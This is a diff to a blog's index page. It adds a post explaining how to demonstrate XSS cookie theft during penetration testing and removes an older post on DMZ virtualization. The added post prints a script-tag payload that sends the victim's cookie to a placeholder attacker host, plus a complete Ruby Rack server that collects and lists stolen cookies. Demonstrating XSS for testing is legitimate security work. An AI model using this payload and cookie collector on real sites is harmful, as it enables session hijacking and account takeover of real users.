@@ -165,6 +165,78 @@
   </span>
 
   <h2>
+    <a href="/blog/2009/03/31/rack_for_pen_te/">Rack for Pen Testing</a>
+  </h2>
+
+  <div>
+    
+    
+    <p>One of the many things I got introduced to at Scotland on Rails was the <a href="http://rack.rubyforge.org/">Rack project</a>.  Designed to help create flexible web application deployments, it creates an interface between webservers and ruby web app. frameworks (rails, sinatra etc).<br />
+Reading some of the examples, it occurred to me that Rack could be pretty handy for web application testing where sometimes it's useful to have a minimal web application to bounce things off.<br />
+One example of this is demo'ing XSS attacks.  A standard XSS attack is cookie stealing.  The way this works is the attacker inserts a script tag with a reference to a URL controlled by the attacker and inserts the cookie for the victim site into a parameter to the URL.<br />
+So for example if we've found an XSS vector we can put</p>
+<pre>
+&lt;script&gt;document.location=&quot;http://&lt;attacker_ip/cookiegrabber?cookie=&quot;+document.cookie&lt;/script&gt;
+</pre>
+<p>into the vulnerable box and if we have a server listening on that IP address we get the cookie..<br />
+Here's where rack comes in.  You can use rack to very quickly create some code to listen on a port and accept the incoming request (and indeed to anything else you can do with ruby, but hey lets start small).<br />
+A proof of concept script to do something like this might look like the one below...</p>
+<pre>
+#!/usr/bin/env ruby
+require 'rubygems'
+require 'rack'
+builder = Rack::Builder.new do
+use Rack::CommonLogger
+@@grabbed = Array.new
+map '/' do
+run Proc.new {|env| [200, {&quot;Content-Type&quot; =&gt; &quot;text/html&quot;}, &quot;&lt;h1&gt; Rack Pen Test Helper&lt;/h1&gt;&quot;]}
+end
+map '/cookiegrabber' do
+app = proc do |env|
+req = Rack::Request.new(env)
+ip = req.ip.to_s
+cookie = req.params['cookie'] || &quot;No Cookie Parameter passed&quot;
+@@grabbed &lt;&lt; [ip,cookie]
+[200, {&quot;Content-Type&quot; =&gt; &quot;text/html&quot;}, &quot;grabbed &quot; + cookie + &quot; from &quot; + ip + &quot;&lt;br /&gt; Grabbed &quot; + @@grabbed.length.to_s + &quot; cookies so far&quot;]
+end
+run app
+end
+map '/cookiegrabbed' do
+app = proc do |env|
+out = &quot;&quot;
+if @@grabbed.length &gt; 0
+@@grabbed.each do |crumb|
+out &lt;&lt; &quot;Grabbed a cookie with value  &quot; + crumb[1] + &quot; from &quot; + crumb[0] + &quot;&lt;br /&gt;&quot;
+end
+else
+out = &quot;Nothing Grabbed so far&quot;
+end
+[200, {&quot;Content-Type&quot; =&gt; &quot;text/html&quot;}, out]
+end
+run app
+end
+end
+Rack::Handler::Mongrel.run builder, :Port =&gt; 9292
+</pre>
+
+    
+    
+  </div>
+
+</article>
+
+
+<article class="home">
+
+  <span class="post-date">
+    
+    March
+    31st,
+    
+    2009
+  </span>
+
+  <h2>
     <a href="/blog/2009/03/31/scotland_on_rai/">Scotland on Rails - Web Application Security</a>
   </h2>
 
@@ -449,37 +521,6 @@ That said I'm no DNS expert so this may well be off base...</p>
 
 </article>
 
-
-<article class="home">
-
-  <span class="post-date">
-    
-    July
-    1st,
-    
-    2008
-  </span>
-
-  <h2>
-    <a href="/blog/2008/07/01/more_virtualiza/">More virtualization fun..</a>
-  </h2>
-
-  <div>
-    
-    
-    <p>There's an interesting post at <a href="http://rationalsecurity.typepad.com/blog/2008/06/the-final-front.html">Hoffs blog</a> around virtualization and DMZs and to what level it's "ok" to virtualize a given DMZ environment, following on from a white paper by VMware on the subject<br />
-As Hoff mentions you need to understand the wider context in any risk assessment, but I actually think that in the scenarios that VMware have painted out, I'd agree with <a href="http://www.virtualization.info/2008/06/whitepaper-dmz-virtualization-with.html">Alessandro</a>, that the fully collapsed DMZs talked about in the paper are a no-no.<br />
-And there's a nice risk assessment reasoning here, it's not just a "ooh hypervisors scary" kind of reaction, honest :) ..<br />
-So here's how it works.  In the diagrams they've used they've laid out a picture of a number of security controls.  The main one being separate firewalls segregating the Internet from each of the DMZs in turn.  This would indicate to me that the risk assessment dictated that no one device should be a point of failure for the security being provided by the environment (a more cost effective, but traditionally seen as more risky design would be a single firewall with multiple interfaces, one for each network.)<br />
-So if we then introduce virtualization to this scenario then it seems that the option of a "partially collapsed" DMZ meets the security requirements as each DMZ has it's own VMware ESX instance and a compromise of the hypervisor won't result in a breach of DMZ segregation.<br />
-I think that in a lot of cases it's easy to look at virtualization as something new but it should be possible to look at the current risk appetite in an environment (are you using separate devices to segregate things, are you relying on VLAN tagging for separation) and then apply that to come up with the appropriate virtualization design.</p>
-
-    
-    
-  </div>
-
-</article>
-
 <hr/>
 
 <ul class="pager"> 
@@ -493,7 +534,7 @@ I think that in a lot of cases it's easy to look at virtualization as something 
   
   
   <li>
-    <span class="page_number">Page: 8 of 47</span>
+    <span class="page_number">Page: 8 of 48</span>
   </li>
 
   
